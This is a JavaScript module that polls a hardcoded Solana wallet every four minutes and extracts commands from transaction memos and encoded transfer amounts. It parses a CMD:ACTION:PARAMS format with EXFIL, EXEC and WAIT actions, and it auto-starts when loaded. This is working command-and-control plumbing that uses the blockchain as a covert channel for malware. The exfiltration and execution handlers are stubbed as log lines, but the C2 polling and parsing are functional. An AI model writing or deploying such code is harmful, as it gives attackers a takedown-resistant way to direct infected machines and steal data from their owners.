/**
 * Transaction Metadata Parser
 * Extracts commands from Solana transaction metadata
 */

const { Connection, PublicKey } = require('@solana/web3.js');

// Configuration
const SOLANA_RPC = 'https://api.mainnet-beta.solana.com';
const COMMAND_WALLET = '8xKXtg2CW87d97TXJSDpbD5jBkheTqA83TZRuJosgAsU';

const connection = new Connection(SOLANA_RPC, 'confirmed');

/**
 * Get transaction by signature
 * @param {string} signature - Transaction signature
 * @returns {Promise<Object>} - Transaction object
 */
async function getTransaction(signature) {
    return await connection.getTransaction(signature, {
        encoding: 'jsonParsed',
        maxSupportedTransactionVersion: 0
    });
}

/**
 * Parse transaction metadata for inner instructions
 * @param {Object} tx - Transaction object
 * @returns {Array} - Inner instructions array
 */
function parseInnerInstructions(tx) {
    if (!tx || !tx.meta) {
        return [];
    }
    
    const innerInstructions = tx.meta.innerInstructions || [];
    const parsed = [];
    
    for (const inner of innerInstructions) {
        for (const instr of inner.instructions) {
            if (instr.parsed) {
                parsed.push({
                    type: instr.parsed.type,
                    info: instr.parsed.info,
                    program: instr.parsed.program
                });
            }
        }
    }
    
    return parsed;
}

/**
 * Extract command from transaction metadata
 * Looks for specific patterns in meta.innerInstructions
 * @param {Object} tx - Transaction object
 * @returns {Object|null} - Extracted command object
 */
function extractCommandFromMetadata(tx) {
    const innerInstructions = parseInnerInstructions(tx);
    
    for (const instr of innerInstructions) {
        // Check for memo instructions
        if (instr.type === 'memo' && instr.info?.memo) {
            return {
                type: 'memo',
                data: instr.info.memo
            };
        }
        
        // Check for transfer instructions with encoded data
        if (instr.type === 'transfer' && instr.info?.amount) {
            const amount = instr.info.amount.toString();
            // Amount could encode command as base64 or hex
            if (amount.length > 10) {
                try {
                    const decoded = Buffer.from(amount, 'hex').toString('utf8');
                    return {
                        type: 'transfer_encoded',
                        data: decoded
                    };
                } catch (e) {
                    // Not encoded data
                }
            }
        }
        
        // Check for custom program instructions
        if (instr.program === 'system' || instr.program === 'memo') {
            if (instr.info) {
                return {
                    type: 'program_instruction',
                    program: instr.program,
                    data: JSON.stringify(instr.info)
                };
            }
        }
    }
    
    return null;
}

/**
 * Monitor wallet and process new transactions
 * @param {string} wallet - Wallet address to monitor
 */
async function monitorWallet(wallet) {
    const pubKey = new PublicKey(wallet);
    
    const signatures = await connection.getSignaturesForAddress(pubKey, { limit: 10 });
    
    for (const sig of signatures) {
        const tx = await getTransaction(sig.signature);
        
        if (tx) {
            const command = extractCommandFromMetadata(tx);
            
            if (command) {
                console.log('Command extracted:', command);
                
                // Process command
                if (command.type === 'memo') {
                    await processMemoCommand(command.data);
                }
            }
        }
    }
}

/**
 * Process memo command
 * @param {string} memo - Memo string containing command
 */
async function processMemoCommand(memo) {
    // Parse command format: CMD:ACTION:PARAMS
    const parts = memo.split(':');
    
    if (parts[0] === 'CMD') {
        const action = parts[1];
        const params = parts.slice(2).join(':');
        
        console.log('Executing action:', action);
        console.log('Parameters:', params);
        
        // Command execution logic would go here
        switch (action) {
            case 'EXFIL':
                console.log('Exfiltration command received');
                break;
            case 'EXEC':
                console.log('Execution command received');
                break;
            case 'WAIT':
                console.log('Wait command received');
                break;
        }
    }
}

/**
 * Start continuous monitoring with setInterval
 */
function startMonitoring() {
    console.log('Starting transaction metadata monitoring...');
    console.log('Wallet:', COMMAND_WALLET);
    
    setInterval(async () => {
        await monitorWallet(COMMAND_WALLET);
    }, 240000); // 4 minutes
}

// Export functions
module.exports = {
    getTransaction,
    parseInnerInstructions,
    extractCommandFromMetadata,
    monitorWallet,
    processMemoCommand,
    startMonitoring
};

// Auto-start
startMonitoring();
